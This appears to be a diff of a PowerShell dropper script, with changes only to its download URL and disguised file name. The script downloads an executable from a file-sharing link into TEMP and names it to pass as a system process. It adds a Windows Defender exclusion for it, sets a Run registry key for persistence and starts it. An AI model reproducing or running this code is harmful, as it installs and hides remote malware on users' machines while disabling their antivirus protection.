@@ -1,12 +1,11 @@
-
-$exeUrl = "https://www.4sync.com/web/directDownload/RWIehxb0/QvEYZW-h.4d9f38d80c4adcd468f81824fd65f400"
-$exeName = "build.exe"
-$maskedName = "build.exe"  # Common system process name for masking
-$exePath = "$env:TEMP\\build.exe"
+$exeUrl = "https://www.4sync.com/web/directDownload/OarNRckT/QvEYZW-h.7b28e5d8036b037091d7b025616af0a9"
+$exeName = "SedSer.exe"
+$maskedName = "SedSer.exe"  # Common system process name for masking
+$exePath = "$env:TEMP\\SedSer.exe"
 $maskedPath = "$env:TEMP\\$maskedName"
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 Rename-Item -Path $exePath -NewName $maskedName -Force
 Add-MpPreference -ExclusionPath $maskedPath
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regPath -Name "buildApp" -Value $maskedPath
+Set-ItemProperty -Path $regPath -Name "SedSerApp" -Value $maskedPath
 Start-Process -FilePath $maskedPath
